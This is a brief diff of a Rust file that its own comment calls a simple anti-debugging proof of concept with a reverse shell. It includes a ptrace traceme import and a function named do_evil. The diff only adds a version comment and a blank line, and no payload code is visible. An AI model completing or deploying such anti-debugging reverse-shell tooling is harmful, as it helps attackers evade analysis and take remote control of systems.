@@ -1,4 +1,4 @@
-use nix::sys::ptrace::traceme;
+use nix::sys::ptrace::traceme;				// nix = "0.14.1"
 use std::process::exit;
 
 /* simple anti-debugging POC w/ reverse shell */
@@ -33,3 +33,4 @@ fn do_evil() {
 		.wait()
 		.unwrap();
 }
+
